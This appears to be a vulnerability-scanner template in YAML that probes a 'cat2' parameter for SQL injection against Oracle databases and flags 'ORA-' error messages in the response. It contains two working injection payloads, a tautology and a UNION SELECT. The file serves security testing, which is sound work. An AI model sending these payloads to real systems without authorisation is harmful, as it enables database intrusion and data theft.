id: sqli3-oracle-11
name: 'SQLi oracle prefix #10 in cat2'
severity: high
type: active
tags:
  - sqli
  - injection
  - oracle
description: 'Triggers oracle error via cat2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cat2:
        - '''))) OR (((''1''=''1'
        - ''') UNION SELECT 1,2--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ORA-'
          - 'Oracle error'
